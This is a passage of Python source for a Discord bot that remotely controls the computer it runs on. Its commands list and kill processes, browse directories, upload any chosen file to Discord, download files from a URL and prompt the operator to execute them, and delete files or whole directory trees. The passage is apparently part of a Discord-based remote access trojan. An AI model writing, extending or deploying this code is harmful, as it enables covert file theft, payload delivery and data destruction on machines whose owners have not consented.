# ============================================================
#  PROCESSES
# ============================================================
@bot.command()
async def processes(ctx):
    try:
        proc = []
        for p in psutil.process_iter(["pid", "name", "memory_info"]):
            try:
                mem = p.info["memory_info"].rss // (1024**2) if p.info["memory_info"] else 0
                proc.append(f"{p.info['pid']:>6}  {mem:>6} MB  {p.info['name']}")
            except Exception:
                continue
        proc.sort(key=lambda s: int(s.split()[0]))
        for c in chunk("\n".join(proc[:200]), 1800):
            await ctx.send(f"```\n{c}\n```")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")

@bot.command()
async def kill(ctx, *, name):
    try:
        killed = 0
        for p in psutil.process_iter(["name"]):
            try:
                if p.info["name"] and name.lower() in p.info["name"].lower():
                    p.kill(); killed += 1
            except Exception:
                pass
        await ctx.reply(f"killed {killed} process(es) matching `{name}`")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")

@bot.command(name="kill-tree")
async def kill_tree(ctx, pid: int):
    try:
        parent = psutil.Process(pid)
        kids = parent.children(recursive=True)
        for c in kids:
            try: c.kill()
            except: pass
        parent.kill()
        await ctx.reply(f"killed tree of pid {pid}")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


# ============================================================
#  FILES  (V4.1 – each row includes full path)
# ============================================================
@bot.command()
async def files(ctx, *, path=None):
    try:
        if not path:
            path = os.path.expanduser("~/Downloads")
        path = os.path.expanduser(path)
        if not os.path.isdir(path):
            return await ctx.reply(f"not a dir: `{path}`")
        items = os.listdir(path)[:200]
        lines = []
        for it in items:
            full = os.path.join(path, it)
            try:
                if os.path.isdir(full):
                    lines.append(f"[DIR]  {it}\n       {full}")
                else:
                    sz = os.path.getsize(full)
                    lines.append(f"[{sz:>10} B]  {it}\n       {full}")
            except Exception:
                lines.append(f"[?]  {it}\n       {full}")
        head = f"📁 `{path}` ({len(items)} items)\n"
        for i, c in enumerate(chunk("\n".join(lines) or "(empty)", 1700)):
            await ctx.send((head if i == 0 else "") + f"```\n{c}\n```")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="getfile")
async def getfile(ctx, *, path):
    try:
        path = os.path.expanduser(path)
        if not os.path.isfile(path):
            return await ctx.reply(f"not a file: `{path}`")
        if os.path.getsize(path) > 25*1024*1024:
            return await ctx.reply("file > 25 MB, uploading may fail (discord limit)")
        await ctx.reply(file=discord.File(path, os.path.basename(path)))
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="sendfile")
async def sendfile(ctx, url: str = None):
    """
    !sendfile <url>            -> downloads url
    !sendfile  (with attachment) -> saves to WORK_DIR then tells you the path
    """
    try:
        if ctx.message.attachments:
            att = ctx.message.attachments[0]
            data = await att.read()
            dest = os.path.join(WORK_DIR, att.filename)
            open(dest, "wb").write(data)
            return await ctx.reply(f"saved → `{dest}` ({len(data)} B)\nrun: `!execute {dest}` or `!shell \"{dest}\"`")
        if not url:
            return await ctx.reply("usage: `!sendfile <url>` or attach a file")
        data = download_bytes(url, timeout=60)
        fname = os.path.basename(urllib.parse.urlparse(url).path) or "download.bin"
        dest = os.path.join(WORK_DIR, fname)
        open(dest, "wb").write(data)
        await ctx.reply(f"downloaded → `{dest}` ({len(data)} B)")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command()
async def trash(ctx, *, path):
    try:
        path = os.path.expanduser(path)
        if os.path.isfile(path):
            os.remove(path)
            return await ctx.reply(f"deleted file: `{path}`")
        if os.path.isdir(path):
            shutil.rmtree(path, ignore_errors=True)
            return await ctx.reply(f"deleted dir: `{path}`")
        await ctx.reply("not found")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


